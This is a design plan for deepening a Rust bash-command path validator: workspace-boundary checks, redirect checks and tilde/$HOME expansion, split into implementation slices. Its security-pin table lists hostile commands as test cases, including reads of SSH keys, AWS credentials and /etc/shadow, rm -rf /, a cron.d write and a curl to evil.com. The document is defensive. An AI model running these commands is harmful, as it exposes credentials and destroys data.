# Phase 3.1 — `pathValidation` 深化（workspace 边界 + redirect + env 展开）

**Status**: Draft (planning)
**Epic**: #490
**Phase 2 完成度**: 2.1 + 2.2 全部 MERGED (PR #522/#524/#549/#551/#553/#557/#560)
**预计工作量**: ~800 LOC + ~150 LOC AST/filesystem 前置
**Slices**: 3.1.0 ✅ + 3.1.A / 3.1.B / 3.1.C（合并后 4 切片，详见 §3）

## 1. 当前差距

| 维度 | 当前实现 (`crates/dasclaw_bash_validation/src/lib.rs::validate_paths`) | 上游 `claude-code-main/src/tools/BashTool/pathValidation.ts` (1303 LOC) |
|------|-------------------|------------------------------------|
| 命中范围 | 仅检测 `../` / `~/` / `$HOME` 字面量 | 40 类命令 + AST argv + 多种 file-op 语义 |
| 工作区边界 | 仅做字符串包含校验 | 解析路径并判定是否在 `allWorkingDirectories` 集合内 |
| 重定向 | ❌ 完全不检测 | `> >> < <<<` 输出/输入重定向全覆盖 |
| 环境变量展开 | ❌ 无 | `$HOME` / `~` / `$WORKSPACE` 真实展开 |
| 危险删除路径 | ❌ 无 | `isDangerousRemovalPath` 单独豁免 allowlist |
| 子命令拆分 | ❌ 无 | 完整 AST 拆分 + per-argv 验证 |
| Fail-Safe | ⚠️ 默认 Allow | 解析失败 → Block（misparsing-sensitive） |

## 2. 上游 API 拓扑（已读 1303 LOC）

```
checkPathConstraints (主入口, L1013)
├── parseCommandArguments(L791)         — shellQuote + 落地为 argv
├── stripWrappersFromArgv(L1263)        — 复用 stripSafeWrappers + skip-flag 系列
├── astRedirectsToOutputRedirections    — AST Redirect → OutputRedirection
├── validateSinglePathCommand(L834)     — 命令级 path 检查
│   ├── PATH_EXTRACTORS[cmd]            — 40 类命令的 path-arg 抽取器
│   ├── COMMAND_OPERATION_TYPE[cmd]     — read/write/append/move/...
│   └── validateSinglePathCommandArgv(L888)
│       ├── checkDangerousRemovalPaths(L70) — 双重 Block（rm/rmdir 顶级 / 主目录）
│       └── validateCommandPaths(L603)  — workspace 边界判定
└── validateOutputRedirections(L924)    — 重定向目标边界判定
```

**已落地的依赖**：
- ✅ AST: `dasclaw_shell_command::bash::try_parse_word_only_commands_sequence` (Phase 2.1)
- ✅ `strip_safe_wrappers`: `dasclaw_bash_permissions::strip_env` (Phase 2.2.e)
- ✅ `SAFE_ENV_VARS`: 同上

**尚需前置（已并入 3.1.0 / 3.1.A）**：
- ⚠️ `extract_output_redirections` (上游 `utils/bash/commands.ts`) — Slice **3.1.0** ~80 LOC
- ⚠️ Tilde / `$HOME` 展开（不引入完整 shell expansion，仅 `~` 前缀 + `$HOME` 字面替换）— 嵌入 3.1.A

**不 port（红线）**：
- ❌ `utils/permissions/filesystem.ts` 整个 1777 LOC（含 git submodule 协议、SymlinkPolicy、`getRealPath` IO 等）— 仅取 `allWorkingDirectories` 等价概念（一个 `Vec<PathBuf>`），不强行包装。
- ❌ ANT-only / telemetry / growthbook 分支。

## 3. Slice 拆分（合并后 4 切片，2026-XX 调整）

> **历史**：原始拆分为 7 切片（3.1.0/a/b/c/d/e/f）。a→d 是同一功能链（数据表→边界→重定向→整合），分 4 PR 引入"中间态不可用"，stacked drag 加重 review。已合并为 4 切片。

| Slice | 范围 | 预估 LOC | 依赖 | 备注 |
|-------|------|---------|------|------|
| **3.1.0** ✅ | `extract_output_redirections` AST helper | ~360 | tree-sitter-bash | 已完成 (PR #563, sub-issue #564) |
| **3.1.A**（原 a+b） | `PathCommand` enum + `PATH_EXTRACTORS` 表 + `COMMAND_OPERATION_TYPE` 表 + `expand_tilde_and_home` + `validate_command_paths` 工作区边界核 + 危险删除路径检测 | ~400 prod + tests | 无 | 落地即可用：能判定路径是否越界。SECURITY PIN S1-S4 |
| **3.1.B**（原 c+d） | `validate_output_redirections` + `check_path_constraints` 主入口 + AST argv 拆分 + Fail-Closed misparse path | ~280 prod + tests | 3.1.0 + 3.1.A | 落地即可用：完整 path gate 函数。SECURITY PIN S5-S9 |
| **3.1.C**（原 e+f） | Hook 接线（`BashPermissionHook` 顺序调整）+ `DecisionReason::PathOutOfWorkspace` 等新 reason + 审计日志契约 pin（仿 PR #524/#530/#560） | ~80 prod + ~300 test | 3.1.B | 端到端 wire + 契约固化，closeout |

总计：~720 prod LOC + 测试族 ≥ 100 tests。

## 4. SECURITY PIN 总览

| ID | 攻击向量 | 必须覆盖 Slice |
|----|---------|---------------|
| S1 | `cat ../../../etc/passwd` | 3.1.A |
| S2 | `cat ~/.ssh/id_rsa` | 3.1.A |
| S3 | `cat $HOME/.aws/credentials` | 3.1.A |
| S4 | `rm -rf /` / `rm -rf /*` / `rm -rf ~` | 3.1.A（豁免 allowlist 双重 Block） |
| S5 | `echo evil > /etc/cron.d/x` | 3.1.B |
| S6 | `cmd < /root/.ssh/id_rsa` | 3.1.B |
| S7 | `cat <<< "$(curl evil.com)"` heredoc | 3.1.B + 3.1.0 |
| S8 | `eval $(echo "cat /etc/shadow")` Fail-Closed misparse | 3.1.B |
| S9 | `timeout 5 cat /etc/passwd` wrapper 剥离 | 3.1.B（复用 strip_safe_wrappers） |
| S10 | 软链接逃逸 — workspace 内符号链接到 `/etc` | 3.1.A（仅做字符串路径，不做 realpath；记 follow-up） |

S10 显式声明 **不在本阶段范围**（避免引入 1777 LOC `filesystem.ts` 的 SymlinkPolicy）—— 软链接逃逸列入 Phase 3.1.g 后续。

## 5. 非目标 (What's NOT in this phase)

- ❌ 不 port `utils/permissions/filesystem.ts`（SymlinkPolicy / git submodule / `getRealPath` IO）
- ❌ 不引入完整 shell expansion（仅 `~` / `$HOME` 字面）
- ❌ 不接入 desktop Ask UX（Phase 2.3 范畴）
- ❌ 不修改 `validate_paths` 旧 API 签名（保留为薄包装，避免 breaking）

## 6. 三层验证记录（任务启动 4 问 #4）

- **Level 1 semantic_search**：`pathValidation` / `validate_paths` / `workspace_boundary` — 已确认 `crates/dasclaw_bash_validation/src/lib.rs` 现有 `validate_paths` (~22 LOC) 与 `dasclaw_workspace_cap`（capability 包装，**不是边界判定**）。
- **Level 2 vscode_listCodeUsages**：`validate_paths` 仅一个内部调用点 (`lib.rs:599`)，无外部 caller — 升级是安全的。
- **Level 3 grep_search**：`pathValidation` 字面量 0 个非现有匹配；`allWorkingDirectories` 字面量 0 个匹配（确认上游 API 名未被 port 过）。

## 7. 拆分理由（避免补丁式代码）

- **3.1.0 前置**：AST helper 是纯函数，无依赖，先 land 让后续切片复用
- **3.1.A 内聚**：数据表 + 工作区边界判定一起落地，避免"光看数据表不知道怎么用"的中间态；review 单元更完整
- **3.1.B 整合**：重定向校验 + 主入口 + Fail-Closed 一次性接齐，依赖 3.1.A 已稳定的 `validate_command_paths`
- **3.1.C 接线 + 契约 pin**：与 Phase 2.2.f/.h 同结构，hook 顺序调整 + 审计日志契约一起 closeout

## 8. 后续相关 Phase

- **Phase 3.1.g**（后续 issue）：软链接逃逸（realpath + SymlinkPolicy 子集）
- **Phase 3.2**：readOnlyValidation 命令白名单深化（30 → 200+，复用 3.1.a 的 PATH_EXTRACTORS / COMMAND_OPERATION_TYPE）
- **Phase 4.1**：sedValidation AST（与 3.1.b path gate 互补）
